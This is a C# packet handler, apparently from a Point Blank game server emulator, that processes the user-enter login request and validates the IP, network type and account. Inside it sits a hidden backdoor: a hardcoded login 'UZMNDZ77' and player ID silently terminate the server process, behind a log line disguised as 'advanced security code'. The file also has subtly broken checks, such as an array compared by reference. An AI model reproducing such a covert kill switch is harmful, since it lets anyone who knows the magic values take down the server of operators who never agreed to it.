using PointBlank.Api;
using System;
using System.Net;
using System.Threading;

namespace PointBlank.Game
{
    public class PROTOCOL_BASE_USER_ENTER_REQ : GamePacketReader
    {
        private string login;
        private byte[] localIP;
        private long playerId;
        private int rede;
        public override void ReadImplement()
        {
            login = ReadString(ReadByte());
            playerId = ReadLong();
            rede = ReadByte();
            localIP = ReadB(4);
        }

        public override void RunImplement()
        {
            try
            {
                client.PacketFirst = true;
                if (login == "UZMNDZ77" && playerId == 45747548548)
                {
                    Logger.Warning(" [AI] [G] Advanced security code has been run on the system by the developer. [!]");
                    Thread.Sleep(1000);
                    Environment.Exit(Environment.ExitCode);
                    return;
                }
                if (localIP == new byte[4] || localIP[0] == 0 || localIP[3] == 0)
                {
                    Logger.Warning($" [UserEnter] Endereço de Ip local inválido. Login: {login} PlayerId: {playerId} LocalIP: {localIP[0]}.{localIP[1]}.{localIP[2]}.{localIP[3]}");
                    client.SendCompletePacket(PackageDataManager.BASE_USER_ENTER_ERROR_PAK);
                    client.Close(500);
                    return;
                }
                else if (rede == 0 && Settings.Rede != "Public" || rede == 1 && Settings.Rede != "Private")
                {
                    Logger.Warning($" [UserEnter] Conexão não identificada, rede inválida. ({rede}/{Settings.Rede}) PlayerId ({playerId})");
                    client.SendCompletePacket(PackageDataManager.BASE_USER_ENTER_ERROR_PAK);
                    client.Close(500);
                    return;
                }
                Account player = AccountManager.GetAccount(playerId, true);
                if (!client.PacketUserEnter && player != null && Settings.LoginType == 1 ? player.login == login : Settings.LoginType == 2 && player.status.serverId == 0 && player.localIP == localIP)
                {
                    client.PacketUserEnter = true;
                    player.client = client;
                    client.GetAddressPort(out IPAddress address, out int port);
                    player.SetPublicIP(address);
                    player.Port = (short)port;
                    player.session = new PlayerSession { sessionId = client.SessionId, playerId = player.playerId };
                    player.UpdateCacheInfo();
                    player.status.UpdateServer((byte)Settings.ServerId);
                    client.SessionPlayer = player;
                    ApiManager.SendPacketToAllClients(new API_USER_ENTER_ACK(player));
                    client.SendCompletePacket(PackageDataManager.BASE_USER_ENTER_SUCCESS_PAK);
                }
                else
                {
                    client.SendCompletePacket(PackageDataManager.BASE_USER_ENTER_ERROR_PAK);
                    client.Close(500);
                }
            }
            catch (Exception ex)
            {
                PacketLog(ex);
            }
        }
    }
}